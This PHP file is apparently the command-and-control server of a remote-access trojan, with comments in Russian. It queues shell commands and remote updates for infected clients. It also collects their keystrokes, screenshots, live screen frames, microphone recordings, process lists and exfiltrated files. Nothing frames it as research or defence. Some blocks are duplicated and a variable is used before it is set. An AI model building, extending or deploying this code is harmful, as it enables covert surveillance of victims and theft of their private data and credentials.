<?php
// api.php

// Файл для хранения данных о клиентах
$dataFile = 'data.json';
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Обработка preflight запросов
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// Загружаем данные или создаём новую структуру, если файла нет
if (file_exists($dataFile)) {
    $data = json_decode(file_get_contents($dataFile), true);
    // Проверяем, что данные загружены правильно
    if ($data === null) {
        $data = ['clients' => []];
        file_put_contents($dataFile, json_encode($data));
    }
} else {
    $data = ['clients' => []];
    file_put_contents($dataFile, json_encode($data));
}
if ($action == 'heartbeat' && $client_id != '') {
    header('Content-Type: application/json; charset=utf-8');
    $ip = $_SERVER['REMOTE_ADDR'];
    $current_time = time();


    if (!isset($data['clients'][$client_id])) {
        $data['clients'][$client_id] = [
            'ip' => $ip,
            'last_seen' => $current_time,
            'command' => '',
            'output' => '',
            'screenshot' => '',
            'file' => '',
            'fm_data' => '',
            'processes' => '',
            'machine' => '',
            'last_process_update' => 0,
            'stream_enabled' => false,
            'last_stream' => 0,
            'update_status' => 'idle', // Новое поле для статуса обновления
            'update_started_at' => 0,  // Время начала обновления
            'last_heartbeat_before_update' => 0 // Последний heartbeat до обновления
        ];
    } else {
        $previous_last_seen = $data['clients'][$client_id]['last_seen'];
        $update_status = $data['clients'][$client_id]['update_status'] ?? 'idle';

        // Если клиент был в состоянии обновления и пропал более чем на 10 секунд
        if ($update_status === 'updating' &&
            ($current_time - $previous_last_seen) > 10 &&
            ($current_time - $data['clients'][$client_id]['update_started_at']) > 15) {
            // Помечаем обновление как успешное, если клиент вернулся
            $data['clients'][$client_id]['update_status'] = 'success';
        }

        $data['clients'][$client_id]['ip'] = $ip;
        $data['clients'][$client_id]['last_seen'] = $current_time;
    }

    file_put_contents($dataFile, json_encode($data));
    echo json_encode(['status' => 'ok']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = $_POST['action'] ?? '';
    $client_id = $_POST['client_id'] ?? '';
    $command = $_POST['command'] ?? '';

    // Всегда перезагружаем данные из файла перед обработкой запроса
    if (file_exists($dataFile)) {
        $currentData = json_decode(file_get_contents($dataFile), true);
        if ($currentData !== null) {
            $data = $currentData;
        }
    }

    if ($action == 'heartbeat' && $client_id != '') {
        header('Content-Type: application/json; charset=utf-8');
        $ip = $_SERVER['REMOTE_ADDR'];
        if (!isset($data['clients'][$client_id])) {
            $data['clients'][$client_id] = [
                'ip' => $ip,
                'last_seen' => time(),
                'command' => '',
                'output' => '',
                'screenshot' => '',
                'file' => '',
                'fm_data' => '', // Новое поле для данных файлового менеджера
                'processes' => '', // Добавляем поле для процессов
                'machine' => '', // Добавляем поле для имени машины
                'last_process_update' => 0, // Добавляем поле для времени обновления процессов
                'stream_enabled' => false, // Новое поле для статуса стрима
                'last_stream' => 0 // Время последнего кадра стрима
            ];
        } else {
            $data['clients'][$client_id]['ip'] = $ip;
            $data['clients'][$client_id]['last_seen'] = time();
        }
        file_put_contents($dataFile, json_encode($data));
        echo json_encode(['status' => 'ok']);
        exit;

    // Добавьте этот код в блок обработки POST-запросов в api.php
// Добавьте этот код в блок обработки GET запросов
}elseif ($action == 'get_clients_info') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;

// Добавьте в api.php в блок обработки POST-запросов
} elseif ($action == 'clear_audio_files' && $client_id != '') {
    $audio_dir = 'audio_' . $client_id;
    if (is_dir($audio_dir)) {
        // Удаляем все файлы в директории
        $files = glob($audio_dir . '/*');
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
        // Очищаем информацию о файлах в данных клиента
        if (isset($data['clients'][$client_id]['audio_files'])) {
            $data['clients'][$client_id]['audio_files'] = [];
            file_put_contents($dataFile, json_encode($data));
        }
        echo json_encode(['status' => 'ok']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Audio directory not found']);
    }
    exit;
    // Добавьте этот код в блок обработки POST-запросов в api.php

// В начале файла добавьте проверку на JSON-запрос
} if ($_SERVER['CONTENT_TYPE'] === 'application/json') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    // Если это keylog данные
    if (isset($data['action']) && $data['action'] === 'keylog') {
        $client_id = $data['client_id'] ?? 'unknown';
        $timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
        $window = $data['window'] ?? 'Unknown';
        $keys = $data['keys'] ?? '';

        // Создаем папку для логов, если не существует
        if (!is_dir('keylogs')) {
            mkdir('keylogs', 0777, true);
        }

        // Форматируем запись лога
        $log_entry = "[$timestamp] window: $window keys: $keys\n";

        // Сохраняем в файл
        file_put_contents("keylogs/$client_id.log", $log_entry, FILE_APPEND | LOCK_EX);

        echo json_encode(['status' => 'ok', 'message' => 'Keylog received']);
        exit;
    }


// В существующий код добавьте обработку очистки логов keylogger
} if ($action === 'clear_keylog') {
    $client_id = $_POST['client_id'];
    $log_file = "keylogs/{$client_id}.log";

    if (file_exists($log_file)) {
        if (unlink($log_file)) {
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Не удалось удалить файл']);
        }
    } else {
        echo json_encode(['status' => 'ok']); // Файл не существует, но это не ошибка
    }
    exit;


} if ($action === 'clear_keylog') {
    $client_id = $_POST['client_id'];
    $log_file = "keylogs/{$client_id}.log";

    if (file_exists($log_file)) {
        if (unlink($log_file)) {
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Не удалось удалить файл']);
        }
    } else {
        echo json_encode(['status' => 'ok']); // Файл не существует, но это не ошибка
    }
    exit;

}elseif ($action == 'send_audio' && $client_id != '') {
    // Создаем папку для аудио файлов, если её нет
    $audio_dir = 'audio_' . $client_id;
    if (!is_dir($audio_dir)) {
        mkdir($audio_dir, 0755, true);
    }

    // Обработка загрузки аудио файла
    if (isset($_FILES['audio']) && $_FILES['audio']['error'] == UPLOAD_ERR_OK) {
        $timestamp = $_POST['timestamp'] ?? time();
        $device = $_POST['device'] ?? 'unknown';

        // Формируем имя файла с временной меткой и устройством
        $filename = $audio_dir . '/' . $timestamp . '_' . $device . '.wav';

        if (move_uploaded_file($_FILES['audio']['tmp_name'], $filename)) {
            // Сохраняем информацию о файле в базу данных
            if (isset($data['clients'][$client_id])) {
                if (!isset($data['clients'][$client_id]['audio_files'])) {
                    $data['clients'][$client_id]['audio_files'] = [];
                }

                $data['clients'][$client_id]['audio_files'][] = [
                    'filename' => $filename,
                    'timestamp' => $timestamp,
                    'device' => $device
                ];

                // Ограничиваем количество хранимых файлов (последние 100)
                if (count($data['clients'][$client_id]['audio_files']) > 100) {
                    $oldest_file = array_shift($data['clients'][$client_id]['audio_files']);
                    if (file_exists($oldest_file['filename'])) {
                        unlink($oldest_file['filename']);
                    }
                }

                file_put_contents($dataFile, json_encode($data));
            }

            echo json_encode(['status' => 'ok', 'file' => $filename]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded file']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No audio file uploaded']);
    }
    exit;



}elseif ($action == 'clear_history' && $client_id != '') {
    $historyFile = 'output_history.json';
    if (file_exists($historyFile)) {
        $historyData = json_decode(file_get_contents($historyFile), true);
        if (is_array($historyData)) {
            // Фильтруем записи, оставляем только те, которые не относятся к указанному клиенту
            $historyData = array_filter($historyData, function($entry) use ($client_id) {
                return $entry['client_id'] !== $client_id;
            });
            // Переиндексируем массив
            $historyData = array_values($historyData);
            file_put_contents($historyFile, json_encode($historyData, JSON_PRETTY_PRINT));
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid history data format']);
        }
    } else {
        echo json_encode(['status' => 'ok']); // Файла нет, значит и очищать нечего
    }
    exit;







// Добавим новый endpoint для установки команды обновления
} elseif ($action == 'set_update_command' && $client_id != '') {
    $update_url = $_POST['update_url'] ?? '';
    if (isset($data['clients'][$client_id]) && !empty($update_url)) {
        $data['clients'][$client_id]['command'] = "update:" . $update_url;
        $data['clients'][$client_id]['update_status'] = 'pending';
        $data['clients'][$client_id]['update_started_at'] = time();
        $data['clients'][$client_id]['last_heartbeat_before_update'] = $data['clients'][$client_id]['last_seen'];

        file_put_contents($dataFile, json_encode($data));
        echo json_encode(['status' => 'ok']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Client not found or update URL missing']);
    }
    exit;
    } elseif ($action == 'get_update_status' && $client_id != '') {
    header('Content-Type: application/json; charset=utf-8');
    if (isset($data['clients'][$client_id])) {
        $client = $data['clients'][$client_id];
        $current_time = time();

        // Если обновление началось, проверяем статус
        if (isset($client['update_status']) && $client['update_status'] != 'idle') {
            // Если клиент пропал после начала обновления и снова появился - обновление успешно
            if ($client['update_status'] == 'updating' &&
                isset($client['last_heartbeat_before_update']) &&
                $client['last_seen'] > $client['last_heartbeat_before_update'] + 10) {
                $data['clients'][$client_id]['update_status'] = 'success';
                file_put_contents($dataFile, json_encode($data));
            }
            // Если прошло больше 5 минут - считаем обновление неудачным
            elseif ($client['update_status'] == 'updating' &&
                   $current_time - $client['update_started_at'] > 300) {
                $data['clients'][$client_id]['update_status'] = 'failed';
                file_put_contents($dataFile, json_encode($data));
            }
        }

        echo json_encode([
            'status' => 'ok',
            'update_status' => $client['update_status'] ?? 'idle',
            'last_seen' => $client['last_seen'] ?? 0,
            'update_started_at' => $client['update_started_at'] ?? 0
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Client not found']);
    }
    exit;
    } elseif ($action == 'get_command' && $client_id != '') {
        header('Content-Type: application/json; charset=utf-8');
        if (isset($data['clients'][$client_id])) {
            $cmd = $data['clients'][$client_id]['command'];
            // Очищаем команду после получения
            $data['clients'][$client_id]['command'] = '';
            file_put_contents($dataFile, json_encode($data));
            echo json_encode(['command' => $cmd]);
        } else {
            echo json_encode(['command' => '']);
        }
        exit;
    } elseif ($action == 'kill_process' && $client_id != '') {
        $pid = $_POST['pid'] ?? '';

        if (isset($data['clients'][$client_id]) && !empty($pid)) {
            $data['clients'][$client_id]['command'] = "kill_process:$pid";
            file_put_contents($dataFile, json_encode($data));
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Client not found or PID missing']);
        }
        exit;

    } elseif ($action == 'send_output' && $client_id != '') {
        header('Content-Type: application/json; charset=utf-8');
        $output = $_POST['output'] ?? '';
        if (isset($data['clients'][$client_id])) {
            // Проверяем, является ли вывод данными файлового менеджера
            if (strpos($output, 'FM_JSON:') === 0) {
                $json_data = substr($output, 8);
                $data['clients'][$client_id]['fm_data'] = $json_data;
                $data['clients'][$client_id]['output'] = "File manager data updated";
            } else {
                $data['clients'][$client_id]['output'] = $output;
            }
            file_put_contents($dataFile, json_encode($data));

            // Логируем вывод в файл output_history.json
            $historyFile = 'output_history.json';
            $historyData = [];
            if(file_exists($historyFile)) {
                $historyData = json_decode(file_get_contents($historyFile), true);
                if(!is_array($historyData)) {
                    $historyData = [];
                }
            }
            $historyData[] = [
                'timestamp' => time(),
                'client_id' => $client_id,
                'output' => $output
            ];
            file_put_contents($historyFile, json_encode($historyData, JSON_PRETTY_PRINT));

            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error']);
        }
        exit;
    } elseif ($action == 'set_command' && $client_id != '') {
        if (isset($data['clients'][$client_id])) {
            $data['clients'][$client_id]['command'] = $command;
            file_put_contents($dataFile, json_encode($data));
            echo json_encode(['status' => 'ok']);
            exit;
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Client not found']);
            exit;
        }


    } elseif ($action == 'send_screenshot' && $client_id != '') {
        // Обработка загрузки скриншота
        if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] == UPLOAD_ERR_OK) {
            $upload_dir = 'screenshots';
            if (!is_dir($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }
            // Формируем имя файла с учётом client_id и времени
            $filename = $upload_dir . '/' . $client_id . '_' . time() . '.png';
            if (move_uploaded_file($_FILES['screenshot']['tmp_name'], $filename)) {
                if (isset($data['clients'][$client_id])) {
                    $data['clients'][$client_id]['screenshot'] = $filename;
                    file_put_contents($dataFile, json_encode($data));
                    echo json_encode(['status' => 'ok', 'file' => $filename]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Client not registered']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded file']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        }
        exit;
    // Добавьте также endpoint для получения списка аудио файлов
} elseif ($action == 'get_audio_files' && $client_id != '') {
    header('Content-Type: application/json; charset=utf-8');

    if (isset($data['clients'][$client_id]) && isset($data['clients'][$client_id]['audio_files'])) {
        echo json_encode($data['clients'][$client_id]['audio_files']);
    } else {
        echo json_encode([]);
    }
    exit;

} elseif ($action == 'get_audio_file' && $client_id != '') {
    $filename = $_GET['filename'] ?? '';

    if (!empty($filename) && file_exists($filename) && strpos($filename, 'audio_' . $client_id) === 0) {
        header('Content-Type: audio/wav');
        header('Content-Length: ' . filesize($filename));
        readfile($filename);
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "Audio file not found";
    }
    exit;


    } elseif ($action == 'send_stream' && $client_id != '') {
        // Обработка загрузки кадра стрима
        if (isset($_FILES['frame']) && $_FILES['frame']['error'] == UPLOAD_ERR_OK) {
            $upload_dir = 'streams';
            if (!is_dir($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }
            // Сохраняем файл с именем client_id.jpg (перезаписываем предыдущий)
            $filename = $upload_dir . '/' . $client_id . '.jpg';
            if (move_uploaded_file($_FILES['frame']['tmp_name'], $filename)) {
                if (isset($data['clients'][$client_id])) {
                    $data['clients'][$client_id]['last_stream'] = time();
                    file_put_contents($dataFile, json_encode($data));
                    echo json_encode(['status' => 'ok', 'file' => $filename]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Client not registered']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded file']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        }
        exit;

    } elseif ($action == 'get_stream' && $client_id != '') {
        // Отдаем последний кадр стрима для client_id
        $filename = 'streams/' . $client_id . '.jpg';
        if (file_exists($filename)) {
            header('Content-Type: image/jpeg');
            readfile($filename);
        } else {
            header("HTTP/1.0 404 Not Found");
            echo "Stream not found";
        }
        exit;

    } elseif ($action == 'set_stream_status' && $client_id != '') {
        // Установка статуса стрима (включен/выключен)
        $status = $_POST['status'] ?? '';
        if (isset($data['clients'][$client_id]) && ($status === '1' || $status === '0')) {
            $data['clients'][$client_id]['stream_enabled'] = ($status === '1');
            file_put_contents($dataFile, json_encode($data));
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Client not found or invalid status']);
        }
        exit;

    } elseif ($action == 'get_stream_status' && $client_id != '') {
        // Получение статуса стрима
        header('Content-Type: application/json; charset=utf-8');
        if (isset($data['clients'][$client_id])) {
            echo json_encode(['stream_enabled' => $data['clients'][$client_id]['stream_enabled']]);
        } else {
            echo json_encode(['stream_enabled' => false]);
        }
        exit;
    // Добавим в блок обработки POST-запросов:
    } elseif ($action == 'report_update_success' && $client_id != '') {
    header('Content-Type: application/json; charset=utf-8');
    if (isset($data['clients'][$client_id])) {
        $data['clients'][$client_id]['update_status'] = 'success';
        $data['clients'][$client_id]['last_seen'] = time();
        file_put_contents($dataFile, json_encode($data));
        echo json_encode(['status' => 'ok']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Client not found']);
    }
    exit;
    } elseif ($action == 'send_processes' && $client_id != '') {
        $processes = $_POST['processes'] ?? '';
        $machine = $_POST['machine'] ?? 'Unknown';
        $system_info = $_POST['system_info'] ?? '';

        if (isset($data['clients'][$client_id])) {
            $data['clients'][$client_id]['processes'] = $processes;
            $data['clients'][$client_id]['machine'] = $machine;
            $data['clients'][$client_id]['system_info'] = $system_info;
            $data['clients'][$client_id]['last_process_update'] = time();

            // Сохраняем историю процессов
            $historyFile = 'processes_history.json';
            $historyData = [];
            if(file_exists($historyFile)) {
                $historyData = json_decode(file_get_contents($historyFile), true);
                if(!is_array($historyData)) {
                    $historyData = [];
                }
            }

            $historyData[] = [
                'timestamp' => time(),
                'client_id' => $client_id,
                'machine' => $machine,
                'processes' => json_decode($processes, true)
            ];

            file_put_contents($historyFile, json_encode($historyData, JSON_PRETTY_PRINT));
            file_put_contents($dataFile, json_encode($data));

            error_log("Processes saved for client: $client_id, count: " . count(json_decode($processes, true)));

            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Client not found']);
        }
        exit;

    } elseif ($action == 'get_processes' && $client_id != '') {
        header('Content-Type: application/json; charset=utf-8');
        if (isset($data['clients'][$client_id]) && !empty($data['clients'][$client_id]['processes'])) {
            $processes = $data['clients'][$client_id]['processes'];
            error_log("Processes retrieved for client: $client_id, length: " . strlen($processes));
            echo $processes;
        } else {
            error_log("No processes found for client: $client_id");
            echo json_encode([]);
        }
        exit;

    } elseif ($action == 'get_client_info' && $client_id != '') {
        header('Content-Type: application/json; charset=utf-8');
        if (isset($data['clients'][$client_id])) {
            echo json_encode([
                'machine' => $data['clients'][$client_id]['machine'] ?? 'Unknown',
                'last_process_update' => $data['clients'][$client_id]['last_process_update'] ?? 0,
                'stream_enabled' => $data['clients'][$client_id]['stream_enabled'] ?? false,
                'last_stream' => $data['clients'][$client_id]['last_stream'] ?? 0
            ]);
        } else {
            echo json_encode([
                'machine' => 'Unknown',
                'last_process_update' => 0,
                'stream_enabled' => false,
                'last_stream' => 0
            ]);
        }
        exit;
    } elseif ($action == 'send_file' && $client_id != '') {
        // Новая ветка для обработки загрузки файла и сохранения в папку data
        if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
            $upload_dir = 'data';
            if (!is_dir($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }
            // Формируем имя файла: client_id, время и оригинальное имя файла
            $original_name = basename($_FILES['file']['name']);
            $filename = $upload_dir . '/' . $client_id . '_' . time() . '_' . $original_name;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)) {
                if (isset($data['clients'][$client_id])) {
                    $data['clients'][$client_id]['file'] = $filename;
                    file_put_contents($dataFile, json_encode($data));
                    echo json_encode(['status' => 'ok', 'file' => $filename]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Client not registered']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded file']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        }
        exit;

    } elseif ($action == 'get_fm_data' && $client_id != '') {
        // Новый endpoint для получения данных файлового менеджера
        header('Content-Type: application/json; charset=utf-8');
        if (isset($data['clients'][$client_id]) && !empty($data['clients'][$client_id]['fm_data'])) {
            echo $data['clients'][$client_id]['fm_data'];
        } else {
            echo json_encode(['status' => 'empty', 'message' => 'No file manager data']);
        }
        exit;
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['status' => 'invalid request']);
    exit;
} else {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['status' => 'invalid request method']);
    exit;
}
?>